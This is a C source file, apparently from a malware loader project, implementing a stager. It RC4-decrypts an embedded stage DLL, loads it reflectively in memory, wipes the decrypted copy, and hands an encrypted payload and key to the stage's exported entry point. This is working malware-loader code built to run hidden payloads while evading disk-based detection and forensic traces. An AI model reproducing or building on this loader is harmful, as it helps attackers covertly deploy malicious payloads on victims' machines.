#include "bootstrap.h"

#include <windows.h>

#include <stdio.h>
#include <stdlib.h>

#include "rc4.h"
#include "reflect.h"
#include "stage_abi.h"

#ifdef DEBUG
#define BOOTSTRAP_LOG(...) fprintf(stderr, __VA_ARGS__)
#else
#define BOOTSTRAP_LOG(...) ((void)0)
#endif

int staged_loader_bootstrap(const unsigned char *enc_stage, size_t enc_stage_len,
                        const unsigned char *stage_key, size_t stage_key_len,
                        const unsigned char *enc_payload,
                        size_t enc_payload_len, const unsigned char *key,
                        size_t key_len, int argc, wchar_t **argv) {
  unsigned char *stage = NULL;
  size_t stage_len = 0;
  void *base;
  staged_loader_main_fn stage_main;

  if (rc4_decrypt_alloc(enc_stage, enc_stage_len, stage_key, stage_key_len,
                        &stage, &stage_len) != 0) {
    BOOTSTRAP_LOG("stager: cannot decrypt stage DLL\n");
    return -1;
  }

  base = reflect_load(stage, stage_len);
  SecureZeroMemory(stage, stage_len);
  free(stage);
  if (base == NULL) {
    BOOTSTRAP_LOG("stager: reflective stage load failed\n");
    return -1;
  }

  stage_main = (staged_loader_main_fn)reflect_export(base, STAGED_LOADER_ENTRY);
  if (stage_main == NULL) {
    BOOTSTRAP_LOG("stager: stage does not export %s\n", STAGED_LOADER_ENTRY);
    return -1;
  }

  return stage_main(argc, argv, enc_payload, enc_payload_len, key, key_len);
}
